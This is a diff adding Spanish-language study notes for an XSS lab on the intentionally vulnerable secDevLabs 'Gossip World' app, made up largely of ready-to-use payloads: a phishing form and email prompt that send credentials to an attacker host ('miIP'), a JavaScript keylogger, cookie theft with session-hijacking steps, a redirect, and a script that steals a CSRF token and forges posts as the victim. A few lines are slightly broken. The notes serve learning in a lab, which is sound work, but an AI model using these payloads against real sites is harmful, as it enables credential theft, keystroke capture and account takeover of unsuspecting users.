@@ -2582,3 +2582,205 @@ Los ataques XSS pueden tener graves consecuencias para las empresas y los usuari
 A continuación se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabiliadad XSS.
 
 [secDevLabs](https://github.com/globocom/secDevLabs)
+
+```bash
+mkdir carpetaParaDescargarElRepositorio
+
+git clone https://github.com/globocom/secDevLabs
+
+cd secDevLabs/owasp-top10-2021/a3/gossip-world
+
+ls
+
+make install
+
+# Usaremos el A3 - Injection (XSS) Gossip World
+http://localhost:10007 # En el navegador, nos creamos dos cuentas
+
+# Usuarios -> s4vitar:s4vitar123, gerard0:gerard0123
+
+# Nos logeamos como s4vitar
+New Gossip -> Title: Hola -> Subtitle: Hola-> Text: Hola esto es una prueba -> Go!
+
+New Gossip -> Title: Probando -> Subtitle: Probando -> Text: <h1>Prueba</h1> -> Go!
+
+New Gossip -> Title: Prueba 2 -> Subtitle: Prueba 2 -> Text: <marquee>Hackeado</marquee> -> Go!
+
+New Gossip -> Title: XSS -> Subtitle: XSS -> Text: <script>alert("XSS")</script> -> Go!
+
+
+
+# +++++++++++++++++++ PROTECTED POST
+# ----- email.js
+<script>
+    var email = prompt("Por favor introduce tu email para visualizar el post", "example@example.com");
+
+    if (email == null || email == ""){
+        alert("Es necesario introducir un correo válido para visualizar el post");
+    } else {
+        fetch("http://miIP/?email=" + email);
+    }
+</script>
+
+cat email.js | xclip -sel clip # Para copiar la salida en la clipboard
+
+New Gossip -> Title: Protected Post -> Subtitle: Important -> Text: Pegamos el texto de email.js -> Go!
+
+python3 -m http.server 80 # Nos levantamos un servidor y nos ponemos en escucha por el puerto 80
+
+# Abrimos el post que publicamos -> Introducimos las credenciales solicitadas por el alert
+
+
+
+# +++++++++++++++++++ PHISHING
+# ----- phising.js
+<div id="formContainer"></div>
+<script>
+    var email;
+    var password;
+    var form = '<form>' +
+        'Email: <input type="email" id="email" required>' +
+        'Contraseña: <input type="password" id="password" required>' +
+        '<input type="button" onclic="submitForm()" value="Submit">' +
+        '</form>';
+    document.getElementById("formContainer").innerHTML = form;
+    function submitForm(){
+        email = document.getElementById("email").value;
+        password = document.getElementById("password").value;
+        fetch("http://miIP/?email=" + email + "&password=" + password);
+    }
+</script>
+
+New Gossip -> Title: Phishing -> Subtitle: Phishing -> Text: pegamos phishing.js -> Go!
+
+python3 -m http.server 80 # Nos levantamos un servidor y nos ponemos en escucha por el puerto 80
+
+# Abrimos el post de phising y vemos el formulario cargado en el post
+# Rellenamos el formulario y vemos que nos manda al servidor en escucha
+
+
+# +++++++++++++++++++ KEYLOGER
+<script>
+    var k = "";
+
+    # la e es para referirnos a la key que se haya presionado
+    document.onkeypress = function(e){
+        e = e || window.event;
+        k += e.key;
+        var i = new Image();
+        i.src = "http://miIP/" + k;
+    };
+
+</script>
+New Gossip -> Title: Keyloger Javascript -> Subtitle: keyloger javascript -> Text: keyloger.js -> Go!
+
+python3 -m http.server 80 # Nos levantamos un servidor y nos ponemos en escucha por el puerto 80
+
+# Abrimos el post keyloger -> Escribimos en cualquier parte y veremos en nuestro servidor en escucha lo tecleado
+
+python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
+
+
+
+# +++++++++++++++++++ REDIRECT
+<script>
+    window.location.href = "https://gerardosalvador.github.io/";
+</script>
+
+New Gossip -> Title: Redirect -> Subtitle: Redirect -> Text: js -> Go!
+
+
+
+# +++++++++++++++++++ External Javascript Source
+# Para este ejercicio nos abrimos dos navegadores cada uno con un usuario diferente
+# Session de atacante ctrl + shift + c 
+# pestaña storage
+# vemos cookie de sesion jwt.io
+# Deschequear el httponly en el navegador de la victima
+<script src="http://miIP/test.js">
+    var request = new XMLHttpRequest();
+    request.open('GET', 'http://miIP/?cookie=' + document.cookie);
+    request.send();
+</script>
+New Gossip -> Title: External Javascript Source -> Subtitle: External Javascript Source -> Text: js -> Go!
+
+python3 -m http.server 80
+
+# Con el navegador victima ir a el post y luego al estar en escucha veremos el cookie robado
+# Copiamos la cookie, lo cual es cookie hijacking
+
+New Gossip -> Title: Quien soy -> Subtitle: quien soy -> Text: quien soy -> Go!
+# vemos que lo publica savitar
+# Como atacante: Ctrl + shift + c -> storage -> quitamos value -> pegamos la cookie robada -> cerramos -> recargamos
+New Gossip -> Title: ahora quien soy -> Subtitle: ahora quien soy -> Text: ahora quien soy -> Go!
+# Vemos que ahora somos el usuario gerard0
+
+
+
+# +++++++++++++++++++ CREAMOS POST FALSO 
+# Abrimos burpsuite
+# Interceptamos un post para ver como se está enviando
+# En burpsuite en el POST vemos los campos title, subtitle, text, csrf_token
+# El crsf_token savitar nos comenta que hay dinamicos y estaticos para este sitio el csrf token es estático
+# Nos creamos un archivo que nos ayudará a robarnos un token si fuera dinamico
+# pwned.js
+<script>
+    var domain = "http://localhost:10007/newgossip";
+    var req1 = new XMLHttpRequest();
+    req1.open('GET', domain, false); # Con el false indicamos que operamos de forma sincrona
+    req1.send();
+
+    var response = req1.responseText;
+    var req2 = new XMLHttpRequest();
+    req2.open('GET', 'http://miIP/?response=' + btoa(response));
+    req2.send();
+
+</script>
+python3 -m http.server 80
+# El usuario savitar crea el gossip
+New Gossip -> Title: Importante -> Subtitle: Mira esto con urgencia -> Text: pwned.js -> Go!
+
+# Me voy como el usuario victima a ver el gossip creado por s4vitar
+# No vemos nada pero en el server vemos la respuesta en base64
+
+echo -n "" | base64 -d; echo
+
+# Vemos el token
+
+# Modificamos el script nuevamente
+<script>
+    var domain = "http://localhost:10007/newgossip";
+    var req1 = new XMLHttpRequest();
+    req1.open('GET', domain, false); # Con el false indicamos que operamos de forma sincrona
+    req1.withCredentials = true; # Para que token no cambie si fuera dinamico
+    req1.send();
+
+    var response = req1.responseText;
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(response, 'text/html');
+    var token = doc.getElementsByName("_csrf_token")[0].value;
+
+    var req2 = new XMLHttpRequest();
+    var data = "title=Mi%20es%20un%20infeliz&subtitle=JEFE%20CABRÓN&text=ODIO%20A%20MI%20JEFE%20POR%20PERRO%20DESGRACIADO&_csrf_token=" + token;
+    req2.open('POST', 'http://localhost:10007/newgossip', false);
+    req2.withCredentials = true;
+    req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    req2.send(data);
+</script>
+
+python3 http.server 80
+
+# Abrimos el gossip Importante
+
+
+
+
+
+
+
+
+
+
+
+
+```
